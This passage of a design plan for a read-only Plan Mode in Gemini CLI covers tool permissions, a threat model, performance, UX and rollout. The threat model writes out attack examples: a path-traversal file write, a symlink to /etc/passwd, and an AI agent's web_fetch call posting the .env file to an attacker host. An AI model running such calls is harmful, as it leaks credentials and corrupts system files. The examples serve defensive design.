2. **Return to previous mode before Plan Mode**
   - ✓ Convenient - restores user's workflow
   - ❌ Requires state tracking (what if user toggled modes?)
   - ❌ Complex - what if user entered Plan Mode via Shift+Tab vs command?

3. **Smart detection based on plan content**
   - ✓ Intelligent - suggests AUTO_EDIT if plan looks ready to implement
   - ❌ Complex - need to parse and understand plan
   - ❌ Unreliable - AI might misclassify

4. **Ask user on exit**
   - ✓ Flexible - user chooses each time
   - ❌ Annoying - extra prompt every exit
   - ❌ Breaks automation scripts

**Recommendation**: Option 1 (always DEFAULT)
**Rationale**: Simplicity and predictability outweigh convenience. Users can easily run `/settings approvalMode auto_edit` if desired.

---

### Decision 2: Plan File Naming Strategy
**Question**: Should we use a fixed filename or allow multiple plans?

**Options**:
1. **Fixed filename: `plan.md`** (recommended)
   - ✓ Simple - always know where the plan is
   - ✓ No naming decisions required
   - ✓ Easy to reference in documentation
   - ❌ Only one active plan per project
   - ❌ Overwrites previous plans (unless manually backed up)

2. **Timestamped: `plan-2024-01-24-143022.md`**
   - ✓ Preserves history of plans
   - ✓ Can compare plans over time
   - ❌ Which plan is current? (need symlink or index file)
   - ❌ Clutters directory with old plans
   - ❌ Policy needs to allow all timestamped patterns

3. **User-specified: `/plan start my-feature-plan`**
   - ✓ Flexible - user controls naming
   - ✓ Multiple plans can coexist
   - ❌ Complex - need plan selection/switching commands
   - ❌ Policy must allow arbitrary filenames (security risk)
   - ❌ AI needs to track which plan is active

4. **Git branch-based: `plan-<branch-name>.md`**
   - ✓ Ties plan to feature branch
   - ✓ Plans naturally separated by feature
   - ❌ Complex - requires git integration
   - ❌ Doesn't work outside git repos

**Recommendation**: Option 1 (fixed `plan.md`)
**Rationale**: Start simple. Can add timestamping or naming later as enhancement. Most users work on one plan at a time.

**Future enhancement**: Add `/plan archive` to move current plan to `plans/archive/plan-{timestamp}.md` before starting new plan.

---

### Decision 3: Web Access Tools (`web_fetch`, `web_search`)
**Question**: Should Plan Mode allow internet access?

**Options**:
1. **Allow web tools** (recommended)
   - ✓ Essential for fetching documentation
   - ✓ Enables searching best practices, examples
   - ✓ AI can research unfamiliar libraries
   - ❌ Potential security concern (data exfiltration)
   - ❌ Requires internet connection (not always available)

2. **Deny web tools**
   - ✓ No security concerns
   - ✓ Works offline
   - ❌ Severely limits AI's ability to research
   - ❌ Forces user to manually fetch docs

3. **Ask user permission for each web request**
   - ✓ User controls internet access
   - ❌ Very annoying - docs fetching is common
   - ❌ Breaks flow of exploration

4. **Allowlist domains (e.g., docs.python.org, developer.mozilla.org)**
   - ✓ Balances security and functionality
   - ❌ Complex - need to maintain domain list
   - ❌ Might block legitimate docs sites
   - ❌ AI might not know which domains are allowed

**Recommendation**: Option 1 (allow web tools)
**Rationale**: Plan quality depends on having good information. Security concerns are mitigated by read-only nature of Plan Mode (no code execution). Document in help text that Plan Mode has internet access.

**Security note**: Consider adding audit logging for web requests in future.

---

### Decision 4: Plan File Template Content
**Question**: What should the initial plan file template contain?

**Options**:
1. **Minimal template** (just headers)
   ```markdown
   # Implementation Plan

   ## Overview

   ## Steps

   ## Testing
   ```
   - ✓ Clean, uncluttered
   - ❌ No guidance on what to include

2. **Detailed template with examples** (recommended)
   ```markdown
   # Implementation Plan

   Created: 2024-01-24

   ## Overview
   Brief description of the task and goals.

   ## Context and Analysis
   Relevant files, existing patterns, dependencies.

   ## Design Decisions
   Approach and rationale.

   ## Implementation Steps
   ### Step 1: [Description]
   - Files to modify: ...
   - Changes: ...
   - Tests: ...

   ## Testing Strategy
   ...
   ```
   - ✓ Guides AI to create comprehensive plans
   - ✓ Consistent structure across all plans
   - ❌ Longer template (more tokens)

3. **Empty file** (no template)
   - ✓ Maximum flexibility
   - ❌ Inconsistent plan structure
   - ❌ AI might not know what to include

**Recommendation**: Option 2 (detailed template)
**Rationale**: Guidance improves plan quality. Token cost is negligible (template is only sent once).

---

### Decision 5: Handling Existing Plan Files
**Question**: What happens when entering Plan Mode if a plan file already exists?

**Options**:
1. **Keep existing file, don't overwrite** (recommended)
   - ✓ Never loses user work
   - ✓ Can resume previous planning session
   - ❌ Might be stale from previous task

2. **Prompt user: keep, overwrite, or rename?**
   - ✓ User has control
   - ❌ Annoying prompt every time
   - ❌ Breaks automation

3. **Automatically archive and create new**
   - ✓ Preserves history
   - ✓ Fresh start for new task
   - ❌ User might want to continue previous plan
   - ❌ Clutters directory over time

4. **Overwrite without asking**
   - ✓ Simple, always fresh plan
   - ❌ Data loss risk (very bad!)

**Recommendation**: Option 1 (keep existing)
**Rationale**: Never destroy user data. User can manually delete/edit if they want a fresh start.

**Future enhancement**: Add `/plan new` command that archives current plan and starts fresh.

---

### Decision 6: Plan Mode and Shift+Tab Interaction
**Question**: How should `/plan start/exit` interact with Shift+Tab mode toggling?

**Options**:
1. **They control the same state** (recommended)
   - `/plan start` → PLAN mode
   - Shift+Tab → toggles to DEFAULT
   - `/plan exit` → DEFAULT mode
   - Shift+Tab → toggles back to PLAN
   - ✓ Simple - one approval mode variable
   - ✓ Consistent - both methods equivalent
   - ❌ No distinction between "entered via command" vs "via hotkey"

2. **Separate states/modes**
   - Shift+Tab toggles between PLAN/DEFAULT
   - `/plan` commands are orthogonal
   - ❌ Complex - two sources of truth
   - ❌ Confusing - which takes precedence?

**Recommendation**: Option 1 (same state)
**Rationale**: Both should control the same `approvalMode` variable. Simpler mental model.

---

### Decision 7: Error Recovery Strategy
**Question**: What happens if plan file creation fails?

**Options**:
1. **Fail hard - don't enter Plan Mode** (recommended)
   - ✓ Clear failure - user knows something is wrong
   - ✓ Prevents confusion (in Plan Mode but no plan file)
   - ❌ Blocks workflow if file system has issues

2. **Continue without plan file (chat-only plans)**
   - ✓ Degraded but functional
   - ❌ Plans not persistent (defeats purpose)
   - ❌ Inconsistent behavior

3. **Retry with global fallback**
   - ✓ Resilient - tries multiple locations
   - ✓ More likely to succeed
   - ❌ Might hide underlying issue (permissions, disk full)
   - Could result in plan being in unexpected location

**Recommendation**: Option 1 for project directory failure → Option 3 (try global)
**Rationale**: Try project dir first; if it fails, try global. If both fail, then fail hard with clear error.

---

### Assumptions Made (Need Validation)

1. **Experimental feature flag exists**: Assumes `config.experimental.planMode` is already defined
   - If not: Add to config schema and default to `false`

2. **Tool names are stable**: Assumes tools like `read_file`, `write_file` won't be renamed
   - If renamed: Update PLAN_MODE_ALLOWED_TOOLS constant

3. **Policy engine supports path patterns**: Assumes `path_patterns` field exists in policy rules
   - If not: Need to implement path matching in policy engine

4. **Glob pattern library available**: Assumes `minimatch` or equivalent is available
   - If not: Add dependency or implement basic glob matching

5. **LSP tools exist**: Assumes `get_hover_info`, `find_references`, etc. are implemented
   - If not: Remove from allowlist (graceful degradation)

6. **Git detection utility exists**: Assumes there's a way to detect if cwd is in a Git repo
   - If not: Implement via `git rev-parse --git-dir` check

7. **File system is accessible**: Assumes `.gemini/` directory can be created
   - If not: Fall back to global directory or temp directory

## Security considerations

### Threat Model

**Attacker Goals**:
1. Modify source code files without leaving Plan Mode
2. Execute arbitrary commands on user's system
3. Exfiltrate sensitive data (credentials, API keys)
4. Corrupt or delete important files

**Attack Vectors and Mitigations**:

#### 1. Path Traversal Attacks
**Attack**: Use `../` sequences to escape `.gemini/plans/` directory
```typescript
write_file({ file_path: '.gemini/plans/../../src/index.ts', content: 'hacked' })
```

**Mitigation**:
- Normalize all paths with `path.resolve()` before policy check
- Resolve symlinks with `fs.realpath()` to get canonical path
- Compare normalized paths against allowed patterns

**Test coverage**: ✓ Included in policy-engine.test.ts

---

#### 2. Symlink Attacks
**Attack**: Create symlink to sensitive file, then write through it
```bash
ln -s /etc/passwd .gemini/plans/plan.md
# AI writes to plan.md, actually modifies /etc/passwd
```

**Mitigation**:
- Resolve symlinks before permission check: `fs.realpath()`
- If realpath points outside `.gemini/plans/`, deny
- Use `O_NOFOLLOW` flag when opening files (don't follow symlinks)

**Test coverage**: ✓ Included in policy-engine.test.ts

---

#### 3. Race Conditions (TOCTOU)
**Attack**: Modify file between permission check and write operation
```
Time 1: Policy checks .gemini/plans/plan.md → allowed
Time 2: Attacker swaps plan.md with symlink to /etc/passwd
Time 3: Write happens → modifies /etc/passwd
```

**Mitigation**:
- Open file with `O_NOFOLLOW` flag (atomic check-and-open)
- Use file descriptor after opening (don't re-resolve path)
- Alternative: Lock file during write operation

**Test coverage**: Partial (unit tests; hard to test race conditions)

---

#### 4. Case Sensitivity Bypass
**Attack**: Use different case to bypass policy on case-insensitive systems
```typescript
write_file({ file_path: '.GEMINI/PLANS/PLAN.MD', content: 'data' })
// Does this match .gemini/plans/plan.md?
```

**Mitigation**:
- Normalize case on case-insensitive file systems (macOS, Windows)
- Use `toLowerCase()` for both path and pattern before matching
- Detect platform with `os.platform()`

**Test coverage**: ✓ Included in policy-engine.test.ts (skipped on Linux)

---

#### 5. Unicode/Encoding Attacks
**Attack**: Use Unicode tricks to make malicious path look like plan path
```
.gemini/plans/plan.md (normal)
.gemini/plans/plan.md (contains zero-width spaces)
.gemini/plans/plan‎.md (contains right-to-left mark)
```

**Mitigation**:
- Normalize Unicode with `String.normalize('NFC')`
- Strip zero-width and control characters
- Use byte-level comparison for critical checks

**Test coverage**: TODO (add in security-focused test suite)

---

#### 6. Data Exfiltration via Web Tools
**Attack**: Use `web_fetch` to POST sensitive data to attacker-controlled server
```typescript
web_fetch({
  url: 'https://attacker.com/exfil',
  method: 'POST',
  body: readFile('.env')
})
```

**Mitigation** (current):
- Document that Plan Mode has internet access
- Trust model: user trusts the AI/model not to exfiltrate

**Future mitigation**:
- Restrict `web_fetch` to GET requests only
- Allowlist trusted domains (docs.python.org, developer.mozilla.org, etc.)
- Add audit logging for all web requests
- Warn if `.env` or credential files are read

**Test coverage**: Not applicable (requires malicious AI)

---

#### 7. Resource Exhaustion
**Attack**: Consume system resources with massive reads or searches
```typescript
glob_search({ pattern: '**/*' }) // Matches millions of files
read_many_files({ paths: [/* 100,000 files */] })
```

**Mitigation**:
- Rate limiting: max N tool calls per minute
- Size limits: max files to read, max pattern matches
- Timeout: kill long-running operations
- Progress indicators: show user what's happening

**Test coverage**: TODO (add performance/stress tests)

---

### Security Best Practices

**Defense in Depth**:
1. **Policy layer**: TOML rules deny dangerous operations
2. **Path normalization**: Prevent directory traversal
3. **Symlink resolution**: Prevent symlink attacks
4. **File system flags**: Use `O_NOFOLLOW`, `O_EXCL` where appropriate
5. **Audit logging**: Record all tool calls in Plan Mode (future)
6. **User awareness**: Document what Plan Mode can/can't do

**Principle of Least Privilege**:
- Plan Mode gets ONLY read tools + plan file write
- No shell execution, no git commits, no package installs
- Even if policy has bug, blast radius is limited

**Fail-Safe Defaults**:
- Unknown tools: deny by default
- Ambiguous paths: deny by default
- Policy parse error: deny all (fail closed)
- Missing config: Plan Mode disabled by default

---

## Performance considerations

### Latency Targets

**User-facing commands** (must be fast):
- `/plan start`: <100ms (create directory + file)
- `/plan status`: <50ms (stat file, format output)
- `/plan exit`: <10ms (toggle mode)

**Tool call overhead** (transparent to user):
- Policy evaluation: <10ms per tool call
- Path normalization: <5ms per path
- Pattern matching: <1ms per pattern

**AI operations** (user expects delay):
- File reading: no change from Build Mode
- Web fetching: depends on network (acceptable)
- Planning: AI thinking time (acceptable)

### Optimization Strategies

**Path Normalization Caching**:
```typescript
const pathCache = new Map<string, string>();

function normalizePathCached(filePath: string): string {
  if (pathCache.has(filePath)) {
    return pathCache.get(filePath)!;
  }

  const normalized = path.resolve(fs.realpathSync(filePath));
  pathCache.set(filePath, normalized);

  return normalized;
}
```
- Avoids redundant `realpath()` calls (can be slow)
- Cache invalidated on mode switch (to avoid stale entries)
- Max cache size: 1000 entries (prevent memory leak)

**Policy Compilation**:
```typescript
// Instead of parsing TOML on every tool call:
const compiledPolicy = compilePolicyRules(parseTOML('plan.toml'));

// Compiled policy is optimized for fast lookups:
type CompiledPolicy = {
  allowedTools: Set<string>,
  deniedTools: Set<string>,
  pathRules: RegExp[], // Pre-compiled glob patterns
};
```
- Parse TOML once on startup, compile to efficient data structure
- Use `Set` for O(1) tool name lookups
- Pre-compile glob patterns to RegExp for fast matching

**Lazy Prompt Generation**:
```typescript
// Don't generate full prompt on every message
// Only when approval mode changes or plan path changes

let cachedPrompt: string | null = null;
let lastMode: ApprovalMode | null = null;
let lastPlanPath: string | null = null;

function getSystemPrompt(context: Context): string {
  const currentPlanPath = getPlanFilePath();

  if (
    cachedPrompt &&
    lastMode === context.approvalMode &&
    lastPlanPath === currentPlanPath
  ) {
    return cachedPrompt;
  }

  // Generate prompt (expensive due to string concatenation)
  cachedPrompt = generatePrompt(context.approvalMode, currentPlanPath);
  lastMode = context.approvalMode;
  lastPlanPath = currentPlanPath;

  return cachedPrompt;
}
```

### Resource Limits

**File System Operations**:
- Max files to read in single `read_many_files`: 100 files
- Max directory depth for `glob_search`: 10 levels
- Max file size to read: 10 MB per file
- Timeout for file operations: 30 seconds

**Network Operations**:
- Max concurrent `web_fetch` requests: 5
- Timeout per request: 30 seconds
- Max response size: 1 MB
- Rate limit: 10 requests/minute

**Memory**:
- Plan file content: keep in memory if <1 MB, stream if larger
- Path cache: max 1000 entries (~100 KB memory)
- Policy cache: ~10 KB

### Monitoring and Metrics

**Telemetry to collect** (anonymized, opt-in):
- Plan Mode session duration (time from start to exit)
- Number of tool calls during planning phase
- Plan file size distribution
- Tool call latency (p50, p95, p99)
- Policy denial rate (how often tools are blocked)

**Performance alerts**:
- If `/plan start` takes >500ms, log warning
- If policy evaluation takes >50ms, investigate bottleneck
- If path cache hit rate <80%, increase cache size

---

## User experience considerations

### Discoverability

**How users learn about Plan Mode**:
1. **Help command**: `/help` lists `/plan` command
2. **Tutorial**: Optional onboarding walk-through
3. **Auto-suggestion**: CLI suggests Plan Mode when user asks vague questions
   ```
   User: "How should I implement feature X?"
   CLI: "💡 Tip: Try Plan Mode (/plan start) for structured exploration and planning"
   ```
4. **Documentation**: README has prominent Plan Mode section

### Onboarding Flow

**First-time user experience**:
1. User runs `/plan start`
2. Feature is disabled (experimental flag off)
3. Error message explains:
   ```
   Plan Mode is an experimental feature. To enable it:

   1. Run: /settings experimental.planMode true
   2. Restart CLI or reload config
   3. Run: /plan start

   Learn more: https://docs.gemini-cli.dev/plan-mode
   ```
4. User enables feature, tries again
5. Success message explains capabilities:
   ```
   ✓ Entered Plan Mode (read-only exploration)
   📝 Plan file: /project/.gemini/plans/plan.md

   In Plan Mode, you can:
     • Explore the codebase thoroughly with all read tools
     • Create detailed, structured plans
     • Research documentation and best practices
     • Ask questions and gather information

   Try asking: "Explore the authentication system and plan how to add OAuth support"

   Exit Plan Mode with /plan exit when ready to implement.
   ```

### Visual Indicators

**Mode awareness** (always visible):
```
[Plan Mode] gemini> _
```
or
```
📋 Plan | gemini> _
```

**Progress feedback**:
```
[Plan Mode] Exploring codebase... (read 15 files)
[Plan Mode] Writing plan to .gemini/plans/plan.md...
[Plan Mode] ✓ Plan updated
```

### Error Messages

**Good error messages** (actionable, clear):

❌ Bad:
```
Error: Permission denied
```

✓ Good:
```
Failed to create plan file: Permission denied

The directory /project/.gemini is not writable.

Possible fixes:
  1. Check directory permissions: ls -la /project/.gemini
  2. Run: chmod u+w /project/.gemini
  3. Or use global plan: Plan Mode will fall back automatically

Need help? /help plan
```

### Keyboard Shortcuts

**Quick access**:
- `Shift+Tab`: Toggle between PLAN and DEFAULT modes (existing)
- `Ctrl+P` (future): Quick open plan file in editor
- `Ctrl+/` (existing): Open help menu (includes Plan Mode docs)

### Editor Integration

**Open plan file from CLI**:
```typescript
/plan open
// Opens .gemini/plans/plan.md in user's $EDITOR
```

**VSCode extension** (future):
- Plan Mode indicator in status bar
- Quick action: "Open Plan File"
- Side-by-side view: chat on left, plan.md on right

---

## Future enhancements

### Phase 2: Plan Management

**Multiple plans**:
```
/plan new <name>      # Create new named plan
/plan list            # List all plans
/plan switch <name>   # Switch to different plan
/plan delete <name>   # Delete a plan
```

**Plan history**:
```
/plan archive         # Move current plan to archive/
/plan history         # Show all archived plans
/plan restore <id>    # Restore archived plan
```

**Plan comparison**:
```
/plan diff <plan1> <plan2>  # Show differences
/plan merge <plan1> <plan2> # Merge two plans
```

### Phase 3: Collaboration

**Shareable plans**:
```
/plan export <url>    # Upload plan to pastebin/gist
/plan import <url>    # Import plan from URL
```

**Team workflows**:
- Plan approvals: require team member sign-off before implementing
- Plan templates: organization-wide plan structure
- Plan reviews: annotate plans with feedback

### Phase 4: AI Enhancements

**Smarter planning**:
- Auto-detect when user should enter Plan Mode
- Suggest plan improvements based on codebase analysis
- Learn from implementation outcomes to improve future plans

**Plan validation**:
- Check if plan is feasible (all referenced files exist)
- Estimate implementation time/complexity
- Identify risks and blockers automatically

**Implementation assistance**:
- Generate implementation steps from approved plan
- Auto-create branches/commits based on plan structure
- Track implementation progress against plan

### Phase 5: Advanced Features

**Interactive planning**:
```
/plan visualize       # Generate Mermaid diagram from plan
/plan simulate        # Dry-run implementation (report issues)
/plan checklist       # Convert plan to interactive checklist
```

**Analytics**:
- Plan quality metrics (completeness, specificity)
- Planning time vs implementation time correlation
- Success rate: how often plans lead to successful implementations

**Integrations**:
- GitHub/GitLab: Create issues from plan steps
- Jira/Linear: Sync plan with project management tool
- Documentation: Auto-update docs based on plan

---

## Migration and rollout strategy

### Rollout Phases

**Phase 0: Internal Testing** (Week 1-2)
- Deploy to internal dev environment
- Team dogfoods Plan Mode on real tasks
- Collect feedback, fix critical bugs
- Success criteria: No critical bugs, positive team feedback

**Phase 1: Opt-in Beta** (Week 3-4)
- Deploy to production with `experimental.planMode = false` by default
- Announce in changelog and Discord/Slack
- Early adopters enable feature, provide feedback
- Success criteria: >20 users try it, <5 bugs reported

**Phase 2: Opt-out Beta** (Week 5-6)
- Change default to `experimental.planMode = true`
- Users who dislike it can disable
- Collect usage metrics and feedback
- Success criteria: >100 active users, <10 bugs reported, no critical issues

**Phase 3: General Availability** (Week 7+)
- Remove experimental flag (always enabled)
- Full documentation and tutorials
- Blog post, social media announcement
- Success criteria: Feature adopted, no major complaints

### Backwards Compatibility

**No breaking changes**:
- Existing commands (`/help`, `/settings`, etc.) unaffected
- Existing approval modes (DEFAULT, AUTO_EDIT) work as before
- Shift+Tab toggle behavior preserved
- Existing plan files (if any) not modified

**Graceful degradation**:
- If user disables experimental flag, `/plan` command shows friendly error
- If `.gemini/plans` directory exists but feature disabled, no errors
- Old CLI versions without Plan Mode can coexist with new versions

### Monitoring and Success Metrics

**Adoption metrics**:
- % of users who enable Plan Mode
- % of sessions that include Plan Mode usage
- Average time spent in Plan Mode per session
- Number of plans created per user per week

**Quality metrics**:
- Average plan file size (proxy for thoroughness)
- Number of plan iterations (how often AI updates plan)
- Implementation success rate (planned vs actual changes)
- User satisfaction (survey or thumbs up/down)

**Performance metrics**:
- `/plan start` latency (target: <100ms p95)
- Policy evaluation overhead (target: <10ms p95)
- Plan file read/write performance

**Health metrics**:
- Error rate (file system errors, policy violations)
- Policy denial rate (how often tools are blocked)
- Crash rate (Plan Mode should never crash CLI)

### Rollback Plan

**If critical issues arise**:
1. **Hotfix path** (for bugs):
   - Deploy fix to production immediately
   - Notify affected users via in-app message

2. **Disable path** (for severe bugs):
   - Change default: `experimental.planMode = false`
   - Keep code in place for later re-enable
   - Investigate root cause, fix, and re-deploy

3. **Rollback path** (for design flaws):
   - Revert commits that introduced Plan Mode
   - Apologize to users, explain decision
   - Plan redesign based on learnings

**Rollback criteria** (any of these):
- >10% of users report critical bugs
- Plan Mode causes data loss
- Security vulnerability discovered
- Performance regression >100ms in critical path

---

## References

### Code Locations
- Plan Mode prompt block: `packages/core/src/core/prompts.ts:136`
- Plan Mode policy: `packages/core/src/policy/policies/plan.toml:28`
- Approval modes in UI: `packages/cli/src/ui/hooks/useApprovalModeIndicator.ts:45`
- Tool name list: `packages/core/src/tools/tool-names.ts:1`
- Storage utilities: `packages/core/src/config/storage.ts` (to be created)
- Plan command: `packages/cli/src/ui/commands/planCommand.ts` (to be created)

### External References
- Claude Code Plan Mode implementation: `codex-rs/core/templates/collaboration_mode/plan.md`
- OpenCode Plan Mode implementation: `opencode/packages/opencode/src/tool/plan.ts`
- Policy engine pattern: `opencode/packages/opencode/src/agent/agent.ts:87`

### Documentation
- User guide: `docs/plan-mode.md` (to be created)
- API reference: `docs/api/approval-modes.md` (to be updated)
- Tutorial: `docs/tutorial/planning-workflow.md` (to be created)

### Related Issues
- GitHub issue tracking this work: (TBD)
- Feature request discussion: (TBD)
- Security review: (TBD)

---

## Implementation Checklist

Use this checklist to track progress during implementation:

### Step 1: Plan File Path Utilities ✓ / ✗
- [ ] Create `packages/core/src/config/storage.ts` if it doesn't exist
- [ ] Implement `getGlobalPlansDir()` function
  - [ ] Uses `os.homedir()` for cross-platform home directory
  - [ ] Returns absolute path to `~/.gemini/plans`
- [ ] Implement `getProjectPlansDir()` function
  - [ ] Detects if current directory is in a Git repository
  - [ ] Returns `<project_root>/.gemini/plans` or `null`
- [ ] Implement `getPlanFilePath()` function
  - [ ] Prefers project directory over global
  - [ ] Returns absolute path to `plan.md`
- [ ] Implement `ensurePlanFileExists()` function
  - [ ] Creates directory with `{ recursive: true }`
  - [ ] Creates file with template if it doesn't exist
  - [ ] Doesn't overwrite existing file
  - [ ] Returns plan file path
- [ ] Write unit tests for all functions
  - [ ] Test project-local path resolution
  - [ ] Test global fallback when not in Git repo
  - [ ] Test path resolution on Windows and Unix
  - [ ] Test error handling (permissions, disk full)

### Step 2: Plan Slash Command ✓ / ✗
- [ ] Create `packages/cli/src/ui/commands/planCommand.ts`
- [ ] Implement `/plan start` subcommand
  - [ ] Checks experimental feature flag
  - [ ] Returns error if disabled
  - [ ] Checks if already in Plan Mode (idempotent)
  - [ ] Calls `ensurePlanFileExists()`
  - [ ] Sets approval mode to PLAN
  - [ ] Returns success message with plan path and guidance
  - [ ] Handles errors gracefully
- [ ] Implement `/plan status` subcommand
  - [ ] Shows current approval mode
  - [ ] Shows plan file path
  - [ ] Checks if plan file exists
  - [ ] Shows file metadata (size, modified time) if exists
  - [ ] Provides helpful tips based on state
- [ ] Implement `/plan exit` subcommand
  - [ ] Checks if in Plan Mode
  - [ ] Sets approval mode to DEFAULT
  - [ ] Returns success message
  - [ ] References plan file location
  - [ ] Handles "exit when not in Plan Mode" gracefully
- [ ] Register command in command registry
- [ ] Update `/help` to include `/plan` command
- [ ] Write unit tests
  - [ ] Test each subcommand's happy path
  - [ ] Test error cases (feature disabled, file errors)
  - [ ] Test idempotency and edge cases

### Step 3: Expand Tool Allowlist ✓ / ✗
- [ ] Update `packages/core/src/policy/policies/plan.toml`
  - [ ] Add comprehensive allow rule with all read-only tools
  - [ ] Add deny rule for all modification tools
  - [ ] Document each tool category with comments
- [ ] Update `packages/core/src/tools/tool-names.ts`
  - [ ] Define `PLAN_MODE_ALLOWED_TOOLS` constant
  - [ ] Include all read-only tools
  - [ ] Add type definition for allowed tools
  - [ ] Add validation helper function
- [ ] Create sync test
  - [ ] Test TOML and TypeScript lists match
  - [ ] Test no dangerous tools in allowlist
  - [ ] Runs in CI pipeline
- [ ] Write unit tests
  - [ ] Test each allowed tool is permitted
  - [ ] Test each denied tool is blocked
  - [ ] Test policy engine correctly enforces rules

### Step 4: Plan File Edit Permissions ✓ / ✗
- [ ] Update `packages/core/src/policy/policies/plan.toml`
  - [ ] Add allow rule for `write_file` with path constraint
  - [ ] Add allow rule for `replace_in_file` with path constraint
  - [ ] Path patterns include both project and global paths
  - [ ] Rule priority is higher than deny rule
- [ ] Implement path matching logic in policy engine
  - [ ] Extract file path from tool arguments
  - [ ] Normalize paths with `path.resolve()`
  - [ ] Resolve symlinks with `fs.realpath()`
  - [ ] Match against glob patterns
  - [ ] Handle case-insensitive systems (macOS/Windows)
  - [ ] Strip Unicode tricks and control characters
- [ ] Write security tests
  - [ ] Test path traversal attacks are blocked
  - [ ] Test symlink attacks are blocked
  - [ ] Test case sensitivity handling
  - [ ] Test writing to plan file is allowed
  - [ ] Test writing to source files is denied

### Step 5: Update Plan Mode Prompt ✓ / ✗
- [ ] Create `getPlanModePrompt(planFilePath)` function in `packages/core/src/core/prompts.ts`
- [ ] Include in prompt:
  - [ ] Plan Mode capabilities (read-only tools, plan file writing)
  - [ ] Plan Mode restrictions (no edits, no execution)
  - [ ] Workflow phases (Exploration → Planning → Communication → Iteration → Exit)
  - [ ] Plan file structure template with sections
  - [ ] Quality guidelines (specific, actionable, testable)
  - [ ] Dos and don'ts for effective planning
  - [ ] Tips for exploration and research
  - [ ] Instruction to write detailed plan in file, brief summary in chat
  - [ ] Plan file path (dynamically injected)
  - [ ] All allowed tools (dynamically generated from constant)
- [ ] Inject prompt when in Plan Mode
  - [ ] Modify `getSystemPrompt()` to check approval mode
  - [ ] Append Plan Mode prompt when `approvalMode === PLAN`
  - [ ] Cache prompt to avoid regeneration
- [ ] Write unit tests
  - [ ] Test prompt includes plan file path
  - [ ] Test prompt lists all allowed tools
  - [ ] Test prompt includes workflow sections
  - [ ] Test prompt only injected in PLAN mode

### Step 6: Tests ✓ / ✗
- [ ] `packages/cli/src/ui/commands/planCommand.test.ts`
  - [ ] Test `/plan start` creates directory and file
  - [ ] Test `/plan start` sets approval mode
  - [ ] Test `/plan start` is idempotent
  - [ ] Test `/plan start` fails if feature disabled
  - [ ] Test `/plan start` handles file system errors
  - [ ] Test `/plan status` shows correct information
  - [ ] Test `/plan status` indicates file existence
  - [ ] Test `/plan exit` exits Plan Mode
  - [ ] Test `/plan exit` handles "not in Plan Mode"
- [ ] `packages/core/src/policy/policy-engine.test.ts`
  - [ ] Test all read-only tools allowed
  - [ ] Test all write tools denied (except plan file)
  - [ ] Test write to plan file allowed
  - [ ] Test write to source file denied
  - [ ] Test path traversal attack blocked
  - [ ] Test symlink attack blocked
  - [ ] Test case sensitivity handling
- [ ] `packages/core/src/core/prompts.test.ts`
  - [ ] Test Plan Mode prompt injected in PLAN mode
  - [ ] Test prompt not injected in DEFAULT mode
  - [ ] Test prompt includes plan file path
  - [ ] Test prompt lists allowed tools
  - [ ] Test prompt includes workflow phases
- [ ] `packages/core/src/config/storage.test.ts`
  - [ ] Test `getGlobalPlansDir()` returns correct path
  - [ ] Test `getProjectPlansDir()` detects Git repos
  - [ ] Test `getPlanFilePath()` prefers project over global
  - [ ] Test `ensurePlanFileExists()` creates directory
  - [ ] Test `ensurePlanFileExists()` creates file with template
  - [ ] Test error handling for all functions
- [ ] End-to-end test
  - [ ] Test complete workflow: start → explore → plan → exit
  - [ ] Verify plan file created and contains content
  - [ ] Verify AI behavior follows prompt instructions
- [ ] CI Integration
  - [ ] All tests run in CI pipeline
  - [ ] Code coverage >80% for new code
  - [ ] Tests pass on all platforms (Linux, macOS, Windows)

### Documentation ✓ / ✗
- [ ] Update `README.md` with Plan Mode section
- [ ] Create `docs/plan-mode.md` with detailed user guide
- [ ] Update `/help` command output
- [ ] Add inline comments to complex logic
- [ ] Document security considerations
- [ ] Create example plan file templates

### Final Validation ✓ / ✗
- [ ] All acceptance criteria met (see Acceptance Criteria section)
- [ ] All tests passing
- [ ] Code review completed
- [ ] Security review completed (if required)
- [ ] Documentation review completed
- [ ] Ready for rollout

### Post-Launch ✓ / ✗
- [ ] Monitor usage metrics
- [ ] Monitor error rates
- [ ] Collect user feedback
- [ ] Address bugs and issues
- [ ] Plan Phase 2 enhancements based on learnings

---

## Summary

This implementation plan provides a comprehensive blueprint for adding Plan Mode to Gemini CLI. The feature enables users to enter a read-only exploration mode where they can thoroughly understand the codebase and create detailed implementation plans before making any changes.

**Key design decisions**:
1. **Path-based access control**: Allow writes only to `.gemini/plans/plan.md`
2. **Comprehensive tool access**: All read-only tools available for thorough exploration
3. **Dual output model**: Detailed plan in file, summary in chat
4. **Security-first approach**: Multiple layers of protection against path attacks
5. **Simple UX**: Explicit commands with helpful feedback

**Implementation scope**: 6 steps covering storage utilities, commands, policy updates, prompts, and comprehensive testing.

**Success criteria**: Feature improves planning quality, is secure, performs well, and is adopted by users.

Ready to implement? Follow the checklist above and refer to detailed sections as needed. Good luck! 🚀
